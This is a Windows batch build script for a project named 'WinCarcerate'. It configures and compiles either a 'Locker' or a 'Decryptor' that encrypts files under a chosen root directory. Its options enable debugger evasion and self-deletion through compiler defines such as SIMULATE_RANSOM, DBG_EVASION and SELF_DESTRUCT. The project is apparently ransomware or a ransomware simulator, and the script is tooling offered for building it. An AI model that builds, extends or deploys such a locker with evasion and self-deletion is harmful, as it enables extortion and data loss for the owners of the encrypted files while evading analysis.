@echo off
setlocal EnableExtensions EnableDelayedExpansion

set "PROJ=WinCarcerate"
set "CFG=Release"
set "PLAT=x64"
set "SRC=WinCarcerate"
set "OVR=%SRC%\override.h"

echo.
echo === %PROJ% Build (%CFG%^|%PLAT%) ===
echo.

REM --- toolchain ---
choice /C ML /N /M "Toolchain: [M]SVC or [L]LVM? "
if errorlevel 2 ( set "TOOLSET=ClangCL" ) else ( set "TOOLSET=v143" )

REM --- executable ---
choice /c LD /N /M "Executable: [L]ocker or [D]ecryptor? "
if errorlevel 2 ( set "EXE=Decryptor" ) else ( set "EXE=Locker" )
 
REM --- subsystem ---
choice /c CW /N /M "SubSystem: [C]onsole or [W]indows? "
if errorlevel 2 ( set "SUB=Windows" ) else ( set "SUB=Console" )

REM --- debugger evasion ---
choice /c YN /N /M "Enable Debugger Evasion: [Y]es or [N]o? "
if errorlevel 2 ( set "DBG=No" ) else ( set "DBG=Yes" )

REM --- self deletion ---
choice /c YN /N /M "Enable Self Deletion: [Y]es or [N]o? "
if errorlevel 2 ( set "DEL=No" ) else ( set "DEL=Yes" )

REM --- root directory ---
set /p DIR=Root directory for encryption/decryption [Enter = current]: 

REM --- override.h ---
if "%DIR%"=="" (
  (
    echo #pragma once
    echo // No CONFIG_ROOT_DIR override; using GetCurrentDirectory at runtime.
  ) > "%OVR%"
) else (
  set "DIR_ESC=%DIR:\=\\%"
  (
    echo #pragma once
    echo #undef CONFIG_ROOT_DIR
    echo #define CONFIG_ROOT_DIR L"!DIR_ESC!", NULL
  ) > "%OVR%"
)

REM --- CL arguments ---
set "CL_ARGS="
if /I "%SUB%"=="Console" ( set "CL_ARGS=!CL_ARGS! /DCONSOLE_STDOUT" ) else ( set "CL_ARGS=!CL_ARGS! /UCONSOLE_STDOUT" )
if /I "%DBG%"=="Yes"  set "CL_ARGS=!CL_ARGS! /DDBG_EVASION"
if /I "%DEL%"=="Yes"  set "CL_ARGS=!CL_ARGS! /DSELF_DESTRUCT"
if /I "%EXE%"=="Decryptor" ( set "CL_ARGS=!CL_ARGS! /DBUILD_DECRYPTOR /USIMULATE_RANSOM" ) else ( set "CL_ARGS=!CL_ARGS! /DSIMULATE_RANSOM" )

REM --- CL command ---
set "CL_SAVED=%CL%"
if /I "%TOOLSET%"=="ClangCL" (
  set "CL=!CL_ARGS! /clang:-mrdrnd %CL_SAVED%"
) else (
  set "CL=!CL_ARGS! %CL_SAVED%"
)

REM --- msbuild ---
msbuild "%PROJ%.sln" /m /t:Rebuild /p:Configuration=%CFG%;Platform=%PLAT%;SubSystem=!SUB!;PlatformToolset=!TOOLSET! /nologo

set "ERR=%ERRORLEVEL%"
set "CL=%CL_SAVED%"
endlocal & exit /b %ERR%
